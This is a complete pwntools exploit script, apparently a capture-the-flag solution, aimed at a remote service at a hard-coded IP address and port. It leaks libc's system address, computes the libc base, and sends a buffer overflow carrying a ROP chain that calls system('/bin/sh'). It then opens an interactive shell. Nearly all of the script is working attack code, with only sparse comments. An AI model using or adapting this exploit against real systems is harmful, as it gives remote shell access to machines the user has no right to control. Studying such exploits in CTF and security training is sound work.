#!/usr/bin/python
# @auther baseline
# github : https://github.com/windyware

from pwn import *
import re

# prase addr from recv data
def prase_addr(buf):
	re_addr = re.compile(r"0x([0-9A-Z]{16,16})")
	addr = re_addr.findall(buf)
	if addr == None:
		return None
	else:
		return addr[0]	
# get link
io = remote('121.194.2.42', 8004)
print io.recv(1024)

# get system addr
io.sendline('2')
print io.recv(1024)
io.sendline('system')
system_address = int(prase_addr(io.recv(1024)), 16)
print '[+] system addr :' , hex(system_address)

# calculater rop chain
# use ROPgadget to search rop chain in lib: ROPgadget --binary libname --only "pop|ret"
system_offset = 0x45390
gadget_offset = 0x21102
binsh_offset  = 0x18cd17

libc_base = system_address - system_offset # get the load base of libc

gadget_address = libc_base + gadget_offset
binsh_address = libc_base + binsh_offset

# prepare payload
payload = 'A' * 8 #overflow the char savedregs 8 bits
payload += p64(gadget_address) # pop rdi;ret
payload += p64(binsh_address) # bin/bash
payload += p64(system_address) # system address


# expolit
print '[+] exploit'
io.sendline('3')
io.recv(1024)
print(len(payload))
io.sendline('32')
io.sendline(payload)
io.recv(1024)


io.interactive()



#
